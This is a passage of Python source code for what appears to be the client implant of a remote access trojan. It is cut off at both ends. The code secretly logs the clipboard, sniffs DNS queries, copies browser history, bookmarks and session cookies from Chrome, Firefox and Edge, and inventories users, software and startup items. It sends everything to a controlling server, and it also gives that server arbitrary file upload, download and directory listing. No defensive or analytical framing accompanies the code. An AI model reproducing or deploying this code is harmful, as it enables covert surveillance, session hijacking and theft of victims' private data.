                # Wait for ready signal
                ready = self.client_socket.recv(1024)
                if ready != b"READY":
                    return
                
                # Send file data
                with open(self.capture_file, 'rb') as f:
                    bytes_sent = 0
                    
                    while bytes_sent < file_size:
                        chunk = f.read(self.buffer_size)
                        if not chunk:
                            break
                        
                        self.client_socket.send(chunk)
                        bytes_sent += len(chunk)
                        
                        # Wait for acknowledgment
                        ack = self.client_socket.recv(1024)
                        if ack == b"CANCEL":
                            return
                
                # Clean up the file
                try:
                    os.remove(self.capture_file)
                except:
                    pass
                
                print("[*] Network capture data sent")
                
            except Exception as e:
                print(f"[!] Error sending network capture: {e}")
                self.client_socket.send(struct.pack('Q', 0))  # Send 0 size on error
        else:
            # No capture file exists
            self.client_socket.send(struct.pack('Q', 0))  # Send 0 size
            print("[*] No network capture file to send")
    
    # Clipboard Monitoring
    def start_clipboard_monitoring(self):
        """Start monitoring the clipboard"""
        if not self.clipboard_monitoring_active:
            print("[*] Starting clipboard monitoring")
            self.clipboard_monitoring_active = True
            self.clipboard_history.clear()
            
            # Start monitoring in a new thread
            self.clipboard_thread = threading.Thread(target=self._clipboard_monitor_thread)
            self.clipboard_thread.daemon = True
            self.clipboard_thread.start()
            
            self.client_socket.send("SUCCESS: Clipboard monitoring started".encode())
        else:
            self.client_socket.send("INFO: Clipboard monitoring already active".encode())
    
    def _clipboard_monitor_thread(self):
        """Thread function for clipboard monitoring"""
        last_value = ""
        
        while self.clipboard_monitoring_active:
            try:
                # Get clipboard contents (text only for now)
                win32clipboard.OpenClipboard()
                try:
                    if win32clipboard.IsClipboardFormatAvailable(win32clipboard.CF_TEXT):
                        value = win32clipboard.GetClipboardData(win32clipboard.CF_TEXT)
                        if value and value != last_value:
                            # Convert bytes to string if necessary
                            if isinstance(value, bytes):
                                value = value.decode('utf-8', errors='replace')
                            
                            # Record the new clipboard value
                            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            self.clipboard_history.append({
                                'timestamp': timestamp,
                                'value': value
                            })
                            last_value = value
                            print(f"[*] New clipboard content: {value[:50]}...")
                finally:
                    win32clipboard.CloseClipboard()
                
                # Check every second
                time.sleep(1)
                
            except Exception as e:
                print(f"[!] Error monitoring clipboard: {e}")
                time.sleep(5)  # Wait longer after an error
    
    def stop_clipboard_monitoring(self):
        """Stop monitoring the clipboard"""
        if self.clipboard_monitoring_active:
            print("[*] Stopping clipboard monitoring")
            self.clipboard_monitoring_active = False
            
            self.client_socket.send("SUCCESS: Clipboard monitoring stopped".encode())
        else:
            self.client_socket.send("INFO: No active clipboard monitoring to stop".encode())
    
    def send_clipboard_data(self):
        """Send the collected clipboard history to the server"""
        try:
            # Convert history to JSON
            data = json.dumps(self.clipboard_history).encode('utf-8')
            
            # Send size first
            self.client_socket.send(struct.pack('Q', len(data)))
            
            # Send data
            self.client_socket.sendall(data)
            
            print(f"[*] Sent {len(self.clipboard_history)} clipboard entries")
            
        except Exception as e:
            print(f"[!] Error sending clipboard data: {e}")
            self.client_socket.send(struct.pack('Q', 0))  # Send 0 size on error
    
    # Browser Data Extraction
    def extract_browser_data(self):
        """Extract and send browser history, bookmarks, and cookies"""
        print("[*] Starting browser data extraction")
        
        try:
            browser_data = {
                'chrome': {
                    'history': self._extract_chrome_history(),
                    'bookmarks': self._extract_chrome_bookmarks(),
                    'cookies': self._extract_chrome_cookies()
                },
                'firefox': {
                    'history': self._extract_firefox_history(),
                    'bookmarks': self._extract_firefox_bookmarks(),
                    'cookies': self._extract_firefox_cookies()
                },
                'edge': {
                    'history': self._extract_edge_history(),
                    'bookmarks': self._extract_edge_bookmarks(),
                    'cookies': self._extract_edge_cookies()
                }
            }
            
            # Convert to JSON
            data = json.dumps(browser_data).encode('utf-8')
            
            # Send size first
            self.client_socket.send(struct.pack('Q', len(data)))
            
            # Send data
            self.client_socket.sendall(data)
            
            print("[*] Browser data sent")
            
        except Exception as e:
            print(f"[!] Error extracting browser data: {e}")
            self.client_socket.send(struct.pack('Q', 0))  # Send 0 size on error
    
    def _extract_chrome_history(self, limit=100):
        """Extract Chrome browsing history"""
        history_items = []
        
        try:
            # Chrome history is stored in SQLite database
            history_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                       'Google', 'Chrome', 'User Data', 
                                       'Default', 'History')
            
            # Create a copy of the database since Chrome locks the original
            temp_history = os.path.join(tempfile.gettempdir(), "chrome_history.db")
            shutil.copy2(history_path, temp_history)
            
            # Query the database
            conn = sqlite3.connect(temp_history)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch', 'localtime') 
                FROM urls 
                ORDER BY last_visit_time DESC 
                LIMIT ?
            """, (limit,))
            
            for row in cursor.fetchall():
                history_items.append({
                    'url': row[0],
                    'title': row[1],
                    'timestamp': row[2]
                })
            
            conn.close()
            
            # Clean up
            os.remove(temp_history)
            
        except Exception as e:
            print(f"[!] Error extracting Chrome history: {e}")
        
        return history_items
    
    def _extract_chrome_bookmarks(self):
        """Extract Chrome bookmarks"""
        bookmarks = []
        
        try:
            # Chrome bookmarks are stored in a JSON file
            bookmarks_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                         'Google', 'Chrome', 'User Data', 
                                         'Default', 'Bookmarks')
            
            with open(bookmarks_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            # Extract bookmarks from the roots
            def extract_bookmarks_from_node(node):
                if node.get('type') == 'url':
                    bookmarks.append({
                        'url': node.get('url'),
                        'name': node.get('name'),
                        'date_added': node.get('date_added')
                    })
                elif node.get('type') == 'folder':
                    for child in node.get('children', []):
                        extract_bookmarks_from_node(child)
            
            # Extract from all roots
            for _, root in data.get('roots', {}).items():
                extract_bookmarks_from_node(root)
            
        except Exception as e:
            print(f"[!] Error extracting Chrome bookmarks: {e}")
        
        return bookmarks
    
    def _extract_chrome_cookies(self, limit=100):
        """Extract Chrome cookies"""
        cookies = []
        
        try:
            # Use browser_cookie3 library to extract cookies
            chrome_cookies = list(browser_cookie3.chrome())[:limit]
            
            for cookie in chrome_cookies:
                cookies.append({
                    'domain': cookie.domain,
                    'name': cookie.name,
                    'value': cookie.value,
                    'path': cookie.path,
                    'expires': cookie.expires
                })
                
        except Exception as e:
            print(f"[!] Error extracting Chrome cookies: {e}")
            
            # Fallback method if browser_cookie3 fails
            try:
                cookies_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                          'Google', 'Chrome', 'User Data', 
                                          'Default', 'Cookies')
                
                # Create a copy of the database
                temp_cookies = os.path.join(tempfile.gettempdir(), "chrome_cookies.db")
                shutil.copy2(cookies_path, temp_cookies)
                
                # Query the database
                conn = sqlite3.connect(temp_cookies)
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT host_key, name, value, path, expires_utc 
                    FROM cookies 
                    LIMIT ?
                """, (limit,))
                
                for row in cursor.fetchall():
                    cookies.append({
                        'domain': row[0],
                        'name': row[1],
                        'value': row[2],
                        'path': row[3],
                        'expires': row[4]
                    })
                
                conn.close()
                
                # Clean up
                os.remove(temp_cookies)
                
            except Exception as e2:
                print(f"[!] Error in fallback Chrome cookies extraction: {e2}")
        
        return cookies
    
    # Firefox methods
    def _extract_firefox_history(self, limit=100):
        """Extract Firefox browsing history"""
        history_items = []
        
        try:
            # Find the Firefox profile directory
            profile_dir = self._get_firefox_profile_dir()
            if not profile_dir:
                return history_items
            
            # History is stored in places.sqlite
            history_path = os.path.join(profile_dir, 'places.sqlite')
            
            if not os.path.exists(history_path):
                return history_items
            
            # Create a copy of the database
            temp_history = os.path.join(tempfile.gettempdir(), "firefox_history.db")
            shutil.copy2(history_path, temp_history)
            
            # Query the database
            conn = sqlite3.connect(temp_history)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT url, title, datetime(visit_date/1000000, 'unixepoch', 'localtime') 
                FROM moz_places p JOIN moz_historyvisits h ON p.id = h.place_id 
                ORDER BY visit_date DESC 
                LIMIT ?
            """, (limit,))
            
            for row in cursor.fetchall():
                history_items.append({
                    'url': row[0],
                    'title': row[1],
                    'timestamp': row[2]
                })
            
            conn.close()
            
            # Clean up
            os.remove(temp_history)
            
        except Exception as e:
            print(f"[!] Error extracting Firefox history: {e}")
        
        return history_items
    
    def _extract_firefox_bookmarks(self):
        """Extract Firefox bookmarks"""
        bookmarks = []
        
        try:
            # Find the Firefox profile directory
            profile_dir = self._get_firefox_profile_dir()
            if not profile_dir:
                return bookmarks
            
            # Bookmarks are stored in places.sqlite
            bookmarks_path = os.path.join(profile_dir, 'places.sqlite')
            
            if not os.path.exists(bookmarks_path):
                return bookmarks
            
            # Create a copy of the database
            temp_bookmarks = os.path.join(tempfile.gettempdir(), "firefox_bookmarks.db")
            shutil.copy2(bookmarks_path, temp_bookmarks)
            
            # Query the database
            conn = sqlite3.connect(temp_bookmarks)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT b.title, p.url 
                FROM moz_bookmarks b 
                JOIN moz_places p ON b.fk = p.id 
                WHERE b.type = 1
            """)
            
            for row in cursor.fetchall():
                bookmarks.append({
                    'name': row[0],
                    'url': row[1]
                })
            
            conn.close()
            
            # Clean up
            os.remove(temp_bookmarks)
            
        except Exception as e:
            print(f"[!] Error extracting Firefox bookmarks: {e}")
        
        return bookmarks
    
    def _extract_firefox_cookies(self, limit=100):
        """Extract Firefox cookies"""
        cookies = []
        
        try:
            # Use browser_cookie3 library to extract cookies
            firefox_cookies = list(browser_cookie3.firefox())[:limit]
            
            for cookie in firefox_cookies:
                cookies.append({
                    'domain': cookie.domain,
                    'name': cookie.name,
                    'value': cookie.value,
                    'path': cookie.path,
                    'expires': cookie.expires
                })
                
        except Exception as e:
            print(f"[!] Error extracting Firefox cookies: {e}")
            
            # Fallback method
            try:
                # Find the Firefox profile directory
                profile_dir = self._get_firefox_profile_dir()
                if not profile_dir:
                    return cookies
                
                # Cookies are stored in cookies.sqlite
                cookies_path = os.path.join(profile_dir, 'cookies.sqlite')
                
                if not os.path.exists(cookies_path):
                    return cookies
                
                # Create a copy of the database
                temp_cookies = os.path.join(tempfile.gettempdir(), "firefox_cookies.db")
                shutil.copy2(cookies_path, temp_cookies)
                
                # Query the database
                conn = sqlite3.connect(temp_cookies)
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT host, name, value, path, expiry 
                    FROM moz_cookies 
                    LIMIT ?
                """, (limit,))
                
                for row in cursor.fetchall():
                    cookies.append({
                        'domain': row[0],
                        'name': row[1],
                        'value': row[2],
                        'path': row[3],
                        'expires': row[4]
                    })
                
                conn.close()
                
                # Clean up
                os.remove(temp_cookies)
                
            except Exception as e2:
                print(f"[!] Error in fallback Firefox cookies extraction: {e2}")
        
        return cookies
    
    def _get_firefox_profile_dir(self):
        """Find the Firefox profile directory"""
        try:
            profiles_dir = os.path.join(os.environ['APPDATA'], 'Mozilla', 'Firefox', 'Profiles')
            
            if not os.path.exists(profiles_dir):
                return None
            
            # Look for the default profile (usually has 'default' in the name)
            for dir_name in os.listdir(profiles_dir):
                if 'default' in dir_name.lower():
                    return os.path.join(profiles_dir, dir_name)
            
            # If no 'default' profile found, use the first one
            dirs = os.listdir(profiles_dir)
            if dirs:
                return os.path.join(profiles_dir, dirs[0])
            
        except Exception as e:
            print(f"[!] Error finding Firefox profile: {e}")
        
        return None
    
    # Edge methods
    def _extract_edge_history(self, limit=100):
        """Extract Edge browsing history"""
        history_items = []
        
        try:
            # Edge history is stored in the same format as Chrome
            history_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                       'Microsoft', 'Edge', 'User Data', 
                                       'Default', 'History')
            
            # Create a copy of the database
            temp_history = os.path.join(tempfile.gettempdir(), "edge_history.db")
            shutil.copy2(history_path, temp_history)
            
            # Query the database
            conn = sqlite3.connect(temp_history)
            cursor = conn.cursor()
            cursor.execute("""
                SELECT url, title, datetime(last_visit_time/1000000-11644473600, 'unixepoch', 'localtime') 
                FROM urls 
                ORDER BY last_visit_time DESC 
                LIMIT ?
            """, (limit,))
            
            for row in cursor.fetchall():
                history_items.append({
                    'url': row[0],
                    'title': row[1],
                    'timestamp': row[2]
                })
            
            conn.close()
            
            # Clean up
            os.remove(temp_history)
            
        except Exception as e:
            print(f"[!] Error extracting Edge history: {e}")
        
        return history_items
    
    def _extract_edge_bookmarks(self):
        """Extract Edge bookmarks"""
        bookmarks = []
        
        try:
            # Edge bookmarks are stored in the same format as Chrome
            bookmarks_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                         'Microsoft', 'Edge', 'User Data', 
                                         'Default', 'Bookmarks')
            
            with open(bookmarks_path, 'r', encoding='utf-8') as f:
                data = json.load(f)
            
            # Extract bookmarks from the roots
            def extract_bookmarks_from_node(node):
                if node.get('type') == 'url':
                    bookmarks.append({
                        'url': node.get('url'),
                        'name': node.get('name'),
                        'date_added': node.get('date_added')
                    })
                elif node.get('type') == 'folder':
                    for child in node.get('children', []):
                        extract_bookmarks_from_node(child)
            
            # Extract from all roots
            for _, root in data.get('roots', {}).items():
                extract_bookmarks_from_node(root)
            
        except Exception as e:
            print(f"[!] Error extracting Edge bookmarks: {e}")
        
        return bookmarks
    
    def _extract_edge_cookies(self, limit=100):
        """Extract Edge cookies"""
        cookies = []
        
        try:
            # Use browser_cookie3 library to extract cookies
            edge_cookies = list(browser_cookie3.edge())[:limit]
            
            for cookie in edge_cookies:
                cookies.append({
                    'domain': cookie.domain,
                    'name': cookie.name,
                    'value': cookie.value,
                    'path': cookie.path,
                    'expires': cookie.expires
                })
                
        except Exception as e:
            print(f"[!] Error extracting Edge cookies: {e}")
            
            # Fallback method
            try:
                cookies_path = os.path.join(os.environ['LOCALAPPDATA'], 
                                          'Microsoft', 'Edge', 'User Data', 
                                          'Default', 'Cookies')
                
                # Create a copy of the database
                temp_cookies = os.path.join(tempfile.gettempdir(), "edge_cookies.db")
                shutil.copy2(cookies_path, temp_cookies)
                
                # Query the database
                conn = sqlite3.connect(temp_cookies)
                cursor = conn.cursor()
                cursor.execute("""
                    SELECT host_key, name, value, path, expires_utc 
                    FROM cookies 
                    LIMIT ?
                """, (limit,))
                
                for row in cursor.fetchall():
                    cookies.append({
                        'domain': row[0],
                        'name': row[1],
                        'value': row[2],
                        'path': row[3],
                        'expires': row[4]
                    })
                
                conn.close()
                
                # Clean up
                os.remove(temp_cookies)
                
            except Exception as e2:
                print(f"[!] Error in fallback Edge cookies extraction: {e2}")
        
        return cookies
    
    # DNS Monitoring
    def start_dns_monitoring(self):
        """Start DNS request monitoring"""
        if not self.dns_monitoring_active:
            print("[*] Starting DNS monitoring")
            self.dns_monitoring_active = True
            self.dns_history.clear()
            
            # Start monitoring in a new thread
            self.dns_thread = threading.Thread(target=self._dns_monitor_thread)
            self.dns_thread.daemon = True
            self.dns_thread.start()
            
            self.client_socket.send("SUCCESS: DNS monitoring started".encode())
        else:
            self.client_socket.send("INFO: DNS monitoring already active".encode())
    
    def _dns_monitor_thread(self):
        """Thread function for DNS monitoring"""
        try:
            # Use scapy to capture DNS packets
            def dns_callback(packet):
                try:
                    if self.dns_monitoring_active and packet.haslayer('DNS'):
                        dns_layer = packet.getlayer('DNS')
                        if dns_layer.qr == 0:  # Query
                            query_name = dns_layer.qd.qname.decode('utf-8')
                            timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                            self.dns_history.append({
                                'timestamp': timestamp,
                                'query': query_name,
                                'type': dns_layer.qd.qtype
                            })
                            print(f"[*] DNS Query: {query_name}")
                except Exception as e:
                    print(f"[!] Error processing DNS packet: {e}")
            
            # Start sniffing for DNS packets
            sniff(filter="udp port 53", prn=dns_callback, store=0)
            
        except Exception as e:
            print(f"[!] Error in DNS monitoring: {e}")
            self.dns_monitoring_active = False
    
    def stop_dns_monitoring(self):
        """Stop DNS monitoring"""
        if self.dns_monitoring_active:
            print("[*] Stopping DNS monitoring")
            self.dns_monitoring_active = False
            
            self.client_socket.send("SUCCESS: DNS monitoring stopped".encode())
        else:
            self.client_socket.send("INFO: No active DNS monitoring to stop".encode())
    
    def send_dns_history(self):
        """Send the collected DNS history to the server"""
        try:
            # Convert history to JSON
            data = json.dumps(self.dns_history).encode('utf-8')
            
            # Send size first
            self.client_socket.send(struct.pack('Q', len(data)))
            
            # Send data
            self.client_socket.sendall(data)
            
            print(f"[*] Sent {len(self.dns_history)} DNS entries")
            
        except Exception as e:
            print(f"[!] Error sending DNS history: {e}")
            self.client_socket.send(struct.pack('Q', 0))  # Send 0 size on error
    
    # System Information
    def send_system_info(self):
        """Send detailed system information to the server"""
        try:
            # Collect system info
            system_info = {
                'platform': platform.system(),
                'platform_release': platform.release(),
                'platform_version': platform.version(),
                'architecture': platform.machine(),
                'hostname': socket.gethostname(),
                'ip_address': socket.gethostbyname(socket.gethostname()),
                'mac_address': ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) 
                                       for elements in range(0,8*6,8)][::-1]),
                'processor': platform.processor(),
                'ram': str(round(psutil.virtual_memory().total / (1024.0 **3)))+" GB",
                'users': self._get_system_users(),
                'running_services': self._get_running_services(),
                'installed_software': self._get_installed_software(),
                'network_interfaces': self._get_network_interfaces(),
                'startup_items': self._get_startup_items(),
                'logged_in_users': self._get_logged_in_users()
            }
            
            # Convert to JSON
            data = json.dumps(system_info).encode('utf-8')
            
            # Send size first
            self.client_socket.send(struct.pack('Q', len(data)))
            
            # Send data
            self.client_socket.sendall(data)
            
            print("[*] System information sent")
            
        except Exception as e:
            print(f"[!] Error sending system info: {e}")
            self.client_socket.send(struct.pack('Q', 0))  # Send 0 size on error
    
    def _get_system_users(self):
        """Get list of system users"""
        users = []
        try:
            if os.name == 'nt':  # Windows
                import win32net
                resume = 0
                while True:
                    (user_list, _, resume) = win32net.NetUserEnum(None, 0, 0, resume)
                    for user in user_list:
                        users.append({
                            'name': user['name'],
                            'comment': user.get('comment', '')
                        })
                    if resume == 0:
                        break
            else:  # Unix/Linux
                with open('/etc/passwd', 'r') as f:
                    for line in f:
                        if line.strip():
                            parts = line.split(':')
                            if len(parts) >= 7:
                                users.append({
                                    'name': parts[0],
                                    'uid': parts[2],
                                    'home': parts[5],
                                    'shell': parts[6]
                                })
        except Exception as e:
            print(f"[!] Error getting system users: {e}")
        
        return users
    
    def _get_running_services(self):
        """Get list of running services"""
        services = []
        try:
            for service in psutil.win_service_iter() if os.name == 'nt' else []:
                try:
                    service_info = service.as_dict()
                    services.append({
                        'name': service_info['name'],
                        'display_name': service_info['display_name'],
                        'status': service_info['status'],
                        'start_type': service_info['start_type']
                    })
                except Exception:
                    pass
        except Exception as e:
            print(f"[!] Error getting running services: {e}")
        
        return services
    
    def _get_installed_software(self, limit=100):
        """Get list of installed software"""
        software = []
        try:
            if os.name == 'nt':  # Windows
                # Look in the registry for installed programs
                reg_paths = [
                    r'SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall',
                    r'SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall'
                ]
                
                for reg_path in reg_paths:
                    try:
                        registry_key = OpenKey(HKEY_LOCAL_MACHINE, reg_path)
                        for i in range(QueryInfoKey(registry_key)[0]):
                            try:
                                subkey_name = EnumKey(registry_key, i)
                                subkey = OpenKey(registry_key, subkey_name)
                                try:
                                    software_name = QueryValueEx(subkey, "DisplayName")[0]
                                    try:
                                        version = QueryValueEx(subkey, "DisplayVersion")[0]
                                    except:
                                        version = "Unknown"
                                    try:
                                        publisher = QueryValueEx(subkey, "Publisher")[0]
                                    except:
                                        publisher = "Unknown"
                                    try:
                                        install_date = QueryValueEx(subkey, "InstallDate")[0]
                                    except:
                                        install_date = "Unknown"
                                        
                                    software.append({
                                        'name': software_name,
                                        'version': version,
                                        'publisher': publisher,
                                        'install_date': install_date
                                    })
                                except:
                                    pass
                                finally:
                                    CloseKey(subkey)
                            except:
                                continue
                        CloseKey(registry_key)
                    except:
                        continue
                    
                    # Limit the number of results
                    if len(software) >= limit:
                        software = software[:limit]
                        break
                        
            else:  # Unix/Linux - use dpkg or rpm
                if os.path.exists("/usr/bin/dpkg"):  # Debian/Ubuntu
                    output = subprocess.check_output(["/usr/bin/dpkg", "-l"]).decode('utf-8')
                    for line in output.split('\n'):
                        if line.startswith('ii'):
                            parts = line.split()
                            if len(parts) >= 3:
                                software.append({
                                    'name': parts[1],
                                    'version': parts[2],
                                    'architecture': parts[3] if len(parts) > 3 else "Unknown"
                                })
                                if len(software) >= limit:
                                    break
                                
                elif os.path.exists("/usr/bin/rpm"):  # Red Hat/Fedora/CentOS
                    output = subprocess.check_output(["/usr/bin/rpm", "-qa"]).decode('utf-8')
                    for line in output.split('\n'):
                        if line.strip():
                            software.append({
                                'name': line.strip(),
                                'version': "N/A",
                                'architecture': "N/A"
                            })
                            if len(software) >= limit:
                                break
                
        except Exception as e:
            print(f"[!] Error getting installed software: {e}")
        
        return software
    
    def _get_network_interfaces(self):
        """Get information about network interfaces"""
        interfaces = []
        try:
            # Get network interfaces using psutil
            for interface_name, interface_addresses in psutil.net_if_addrs().items():
                for address in interface_addresses:
                    if address.family == socket.AF_INET:  # IPv4
                        interfaces.append({
                            'interface': interface_name,
                            'ip': address.address,
                            'netmask': address.netmask,
                            'broadcast': getattr(address, 'broadcast', None)
                        })
                    elif address.family == socket.AF_INET6:  # IPv6
                        interfaces.append({
                            'interface': interface_name,
                            'ip': address.address,
                            'netmask': address.netmask,
                            'broadcast': None
                        })
        except Exception as e:
            print(f"[!] Error getting network interfaces: {e}")
        
        return interfaces
    
    def _get_startup_items(self):
        """Get items that run at startup"""
        startup_items = []
        try:
            if os.name == 'nt':  # Windows
                # Check Run keys in registry
                run_keys = [
                    r'SOFTWARE\Microsoft\Windows\CurrentVersion\Run',
                    r'SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce',
                    r'SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Run',
                    r'SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\RunOnce'
                ]
                
                # Check both HKLM and HKCU
                for root_key, key_name in [(HKEY_LOCAL_MACHINE, "HKLM"), (HKEY_CURRENT_USER, "HKCU")]:
                    for run_key in run_keys:
                        try:
                            registry_key = OpenKey(root_key, run_key)
                            for i in range(QueryInfoKey(registry_key)[1]):
                                try:
                                    name, value, _ = EnumValue(registry_key, i)
                                    startup_items.append({
                                        'source': f"{key_name}\\{run_key}",
                                        'name': name,
                                        'command': value
                                    })
                                except:
                                    continue
                            CloseKey(registry_key)
                        except:
                            continue
                
                # Check Startup folders
                startup_folders = [
                    os.path.join(os.environ['APPDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup'),
                    os.path.join(os.environ['PROGRAMDATA'], 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')
                ]
                
                for folder in startup_folders:
                    if os.path.exists(folder):
                        for item in os.listdir(folder):
                            item_path = os.path.join(folder, item)
                            startup_items.append({
                                'source': folder,
                                'name': item,
                                'command': item_path
                            })
                            
            else:  # Unix/Linux
                # Check common startup locations
                startup_files = [
                    '/etc/rc.local',
                    '/etc/init.d',
                    '/etc/systemd/system',
                    os.path.expanduser('~/.config/autostart')
                ]
                
                for file_path in startup_files:
                    if os.path.exists(file_path):
                        if os.path.isdir(file_path):
                            for item in os.listdir(file_path):
                                startup_items.append({
                                    'source': file_path,
                                    'name': item,
                                    'command': os.path.join(file_path, item)
                                })
                        else:
                            startup_items.append({
                                'source': os.path.dirname(file_path),
                                'name': os.path.basename(file_path),
                                'command': file_path
                            })
                
        except Exception as e:
            print(f"[!] Error getting startup items: {e}")
        
        return startup_items
    
    def _get_logged_in_users(self):
        """Get currently logged in users"""
        users = []
        try:
            for user in psutil.users():
                users.append({
                    'name': user.name,
                    'terminal': user.terminal,
                    'host': getattr(user, 'host', ''),
                    'started': datetime.fromtimestamp(user.started).strftime('%Y-%m-%d %H:%M:%S')
                })
        except Exception as e:
            print(f"[!] Error getting logged in users: {e}")
        
        return users
class ClientFileHandler:
    """Handler for file transfer operations on the client side"""
    
    def __init__(self, client_socket, buffer_size=4096):
        self.client_socket = client_socket
        self.buffer_size = buffer_size
    
    def handle_file_command(self, command):
        """Process file-related commands from the server"""
        parts = command.split('|')
    
        if parts[0] == "FILE_UPLOAD":
            # Server wants to upload a file to this client
            if len(parts) >= 3:
                dest_path = parts[1]
                file_size = int(parts[2])
                resume_position = int(parts[3]) if len(parts) > 3 else 0
                transfer_id = parts[4] if len(parts) > 4 else None
                self.receive_file(dest_path, file_size, resume_position, transfer_id)
            else:
                self.client_socket.send(b"Invalid upload command format")
                
        elif parts[0] == "FILE_DOWNLOAD":
            # Server wants to download a file from this client
            if len(parts) >= 2:
                file_path = parts[1]
                resume_position = int(parts[2]) if len(parts) > 2 else 0
                transfer_id = parts[3] if len(parts) > 3 else None
                self.send_file(file_path, resume_position, transfer_id)
            else:
                self.client_socket.send(b"Invalid download command format")
                
        elif parts[0] == "FILE_LIST":
            # Server wants a list of files in a directory
            if len(parts) >= 2:
                directory = parts[1]
                self.list_files(directory)
            else:
                self.send_error("Invalid list command format")
    
    def receive_file(self, dest_path, file_size, resume_position=0, transfer_id=None):
        """Receive a file from the server and save it to dest_path"""
        try:
            print(f"[*] Receiving file to {dest_path}, size: {file_size}, resume from: {resume_position}")
            
            # Create directory if it doesn't exist
            dest_dir = os.path.dirname(dest_path)
            if not os.path.exists(dest_dir):
                print(f"[*] Creating directory: {dest_dir}")
                os.makedirs(dest_dir, exist_ok=True)
            
            # Check if we should resume and if the file exists
            file_mode = 'ab' if resume_position > 0 and os.path.exists(dest_path) else 'wb'
            
            if resume_position > 0:
                # Verify the file size matches the expected resume position
                if os.path.exists(dest_path):
                    actual_size = os.path.getsize(dest_path)
                    if actual_size != resume_position:
                        print(f"[!] Warning: File size mismatch for resume. Expected: {resume_position}, Actual: {actual_size}")
                        # Adjust resume position to match the file size
                        resume_position = actual_size
                else:
                    print(f"[!] Cannot resume: File {dest_path} does not exist")
                    file_mode = 'wb'
                    resume_position = 0
            
            print(f"[*] Opening file in mode: {file_mode}")
            
            # Send ready signal
            self.client_socket.send(b"READY")
            print(f"[*] Sent READY signal")
            
            # Receive file data
            with open(dest_path, file_mode) as f:
                if resume_position > 0:
                    print(f"[*] Seeking to position: {resume_position}")
                    f.seek(resume_position)
                    
                bytes_received = resume_position
                
                print(f"[*] Starting to receive data from position: {bytes_received}")
                
                while bytes_received < file_size:
                    remaining = min(self.buffer_size, file_size - bytes_received)
                    chunk = self.client_socket.recv(remaining)
                    
                    if not chunk:
                        print(f"[!] No data received, connection may be closed")
                        break
                        
                    if chunk == b"CANCEL":
                        print(f"[!] Transfer cancelled by server")
                        self.client_socket.send(b"CANCELLED")
                        return
                    
                    chunk_size = len(chunk)
                    print(f"[*] Received chunk of size: {chunk_size}")
                    
                    f.write(chunk)
                    bytes_received += chunk_size
                    
                    # Print progress periodically
                    if bytes_received % (5 * self.buffer_size) == 0:
                        print(f"[*] Progress: {bytes_received}/{file_size} bytes ({(bytes_received/file_size)*100:.1f}%)")
                    
                    # Send acknowledgment
                    self.client_socket.send(b"ACK")
            
            print(f"[*] File reception complete: {bytes_received}/{file_size} bytes")
            
            # Send success message
            self.client_socket.send(b"SUCCESS")
            print(f"[*] Sent SUCCESS signal")
            
        except Exception as e:
            print(f"[!] Error receiving file: {e}")
            # Try to send error message
            try:
                error_msg = f"ERROR: {str(e)}"
                print(f"[!] Sending error: {error_msg}")
                self.client_socket.send(error_msg.encode())
            except Exception as e2:
                print(f"[!] Failed to send error message: {e2}")

    def send_file(self, file_path, resume_position=0, transfer_id=None):
        """Send a file to the server"""
        try:
            if not os.path.isfile(file_path):
                self.client_socket.send(b"ERROR")
                self.client_socket.send(f"File not found: {file_path}".encode())
                return
            
            # Get file size
            file_size = os.path.getsize(file_path)
            
            # Send file size first
            self.client_socket.send(struct.pack('Q', file_size))
            
            # Wait for ready signal
            ready = self.client_socket.recv(1024)
            if ready != b"READY":
                return
            
            # Send file data
            with open(file_path, 'rb') as f:
                if resume_position > 0:
                    f.seek(resume_position)
                    
                bytes_sent = resume_position
                
                while bytes_sent < file_size:
                    chunk = f.read(self.buffer_size)
                    if not chunk:
                        break
                    
                    self.client_socket.send(chunk)
                    bytes_sent += len(chunk)
                    
                    # Wait for acknowledgment
                    ack = self.client_socket.recv(1024)
                    if ack == b"CANCEL":
                        return
            
            # Wait for final confirmation
            self.client_socket.recv(1024)  # Should be SUCCESS or CANCEL
            
        except Exception as e:
            # Just log the error, server will handle timeout
            print(f"Error sending file: {e}")
    
    def list_files(self, directory):
        """List files in a directory and send the listing to the server"""
        try:
            if not os.path.isdir(directory):
                self.send_error(f"Directory not found: {directory}")
                return
            
            # Get list of files and folders
            file_list = []
            try:
                for item in os.listdir(directory):
                    full_path = os.path.join(directory, item)
                    
                    # Get file info
                    stats = os.stat(full_path)
                    size = stats.st_size
                    modified = datetime.fromtimestamp(stats.st_mtime).strftime('%Y-%m-%d %H:%M:%S')
                    
                    # Determine type
                    if os.path.isdir(full_path):
                        item_type = "Directory"
                        size_str = ""
                    else:
                        ext = os.path.splitext(item)[1]
                        item_type = ext if ext else "File"
                        size_str = self.format_size(size)
                    
                    # Add to list
                    file_list.append(f"{item}|{size_str}|{item_type}|{modified}")
            except Exception as e:
                file_list.append(f"ERROR|{str(e)}|Error|{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}")
            
            # Join list into a string
            file_list_str = '\n'.join(file_list)
            
            # Send size first
            data = file_list_str.encode('utf-8')
            self.client_socket.send(struct.pack('Q', len(data)))
            
            # Send actual data
            self.client_socket.sendall(data)
            
        except Exception as e:
            self.send_error(f"Error listing directory: {str(e)}")
    
    def send_error(self, error_msg):
        """Send an error message back to the server"""
        try:
            error_data = f"ERROR: {error_msg}".encode('utf-8')
